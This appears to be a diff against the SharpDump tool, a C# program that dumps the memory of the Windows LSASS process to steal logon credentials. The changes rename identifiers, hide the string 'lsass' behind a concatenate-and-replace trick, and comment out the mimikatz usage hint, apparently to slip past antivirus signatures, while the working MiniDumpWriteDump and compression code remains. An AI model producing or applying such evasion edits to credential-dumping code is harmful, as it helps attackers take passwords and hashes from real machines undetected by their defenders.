@@ -5,7 +5,7 @@ using System.IO.Compression;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 
-namespace SharpDump
+namespace SharpyDumpy
 {
     class Program
     {
@@ -22,7 +22,7 @@ namespace SharpDump
             WindowsPrincipal principal = new WindowsPrincipal(identity);
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
-
+        
         public static void Compress(string inFile, string outFile)
         {
             try
@@ -47,16 +47,17 @@ namespace SharpDump
                 Console.WriteLine("[X] Exception while compressing file: {0}", ex.Message);
             }
         }
-
-        public static void Minidump(int pid = -1)
+        
+        public static void Megadump(int pid = -1)
         {
             IntPtr targetProcessHandle = IntPtr.Zero;
             uint targetProcessId = 0;
 
             Process targetProcess = null;
+            
             if (pid == -1)
             {
-                Process[] processes = Process.GetProcessesByName("lsass");
+                Process[] processes = Process.GetProcessesByName(("sl" + "ass").Replace("sl", "ls"));
                 targetProcess = processes[0];
             }
             else
@@ -72,13 +73,13 @@ namespace SharpDump
                     return;
                 }
             }
-
-            if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity())
+            
+            if (targetProcess.ProcessName == ("sl"+"ass").Replace("sl","ls") && !IsHighIntegrity())
             {
                 Console.WriteLine("\n[X] Not in high integrity, unable to MiniDump!\n");
                 return;
             }
-
+            
             try
             {
                 targetProcessId = (uint)targetProcess.Id;
@@ -89,20 +90,23 @@ namespace SharpDump
                 Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                 return;
             }
+            
             bool bRet = false;
-
+            
             string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
             string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
             string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);
 
             Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
-
+            
             using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
             {
                 bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
             }
-
+            
+            
             // if successful
+            
             if(bRet)
             {
                 Console.WriteLine("[+] Dump successful!");
@@ -126,15 +130,16 @@ namespace SharpDump
                 {
                     Console.WriteLine(String.Format("\n[*] Operating System : {0}", OS));
                     Console.WriteLine(String.Format("[*] Architecture     : {0}", arch));
-                    Console.WriteLine(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
+                    //Console.WriteLine(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
                 }
             }
             else
             {
                 Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
             }
+            
         }
-
+        
         static void Main(string[] args)
         {
             string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
@@ -147,8 +152,7 @@ namespace SharpDump
 
             if (args.Length ==0)
             {
-                // dump LSASS by default
-                Minidump();
+                Megadump();
             }
             else if (args.Length == 1)
             {
@@ -156,16 +160,16 @@ namespace SharpDump
                 if (int.TryParse(Convert.ToString(args[0]), System.Globalization.NumberStyles.Any, System.Globalization.NumberFormatInfo.InvariantInfo, out retNum))
                 {
                     // arg is a number, so we're specifying a PID
-                    Minidump(retNum);
+                    Megadump(retNum);
                 }
                 else
                 {
-                    Console.WriteLine("\nPlease use \"SharpDump.exe [pid]\" format\n");
+                    Console.WriteLine("\nPlease use \"SharpyDumpy.exe [pid]\" format\n");
                 }
             }
             else if (args.Length == 2)
             {
-                Console.WriteLine("\nPlease use \"SharpDump.exe [pid]\" format\n");
+                Console.WriteLine("\nPlease use \"SharpyDumpy.exe [pid]\" format\n");
             }
         }
     }
